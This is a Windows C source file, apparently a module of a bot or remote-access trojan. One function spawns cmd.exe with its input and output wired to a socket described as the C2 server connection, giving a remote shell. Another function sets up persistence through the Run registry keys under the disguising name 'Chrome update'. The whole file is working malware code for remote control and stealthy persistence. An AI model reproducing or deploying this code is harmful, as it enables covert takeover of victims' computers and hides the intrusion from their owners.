#include <windows.h>
#include "modules.h"

/* spawn a shell with the cmd process and pipe stdin, out, and err to the socket */
int spawn_shell(HANDLE sock_pipe)
{
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  char process[8]= {'c','m','d','.','e','x','e','\0'};
  int result= 0;

  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

  /* send stdin, stdout, and stderr of the 
     created process to the socket connection (C2Server) */
  si.hStdInput= si.hStdOutput= si.hStdError= sock_pipe;

  ZeroMemory(&pi, sizeof(pi));

  /* create the shell */
  if (!(CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)))
      result= 1;
  
  /* wait for the process to end, then close the handles */
  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  return result;
}

/* open and set a registry runkey for persistance. first attempts the admin path,
   then the user path if insufficient perms. */
int regkey_persist(char *bot_path)
{
  char *admin_key= "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
  char *user_key=  "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
  char *key_name= "Chrome update";
  HKEY hkey;
  LSTATUS status;
  
  status= RegOpenKeyEx(HKEY_LOCAL_MACHINE, admin_key, 0, KEY_ALL_ACCESS, &hkey);

  if (status == ERROR_SUCCESS) /* admin access */
    RegSetValueEx(hkey, key_name, 0, REG_SZ, (LPBYTE)bot_path, MAX_PATH);
  else { /* no admin access */
    status= RegOpenKeyEx(HKEY_CURRENT_USER, user_key, 0, KEY_ALL_ACCESS, &hkey);
    RegSetValueEx(hkey, key_name, 0, REG_SZ, (LPBYTE)bot_path, MAX_PATH);
  }
      
  return (status == ERROR_SUCCESS) ? 0 : 1;
}





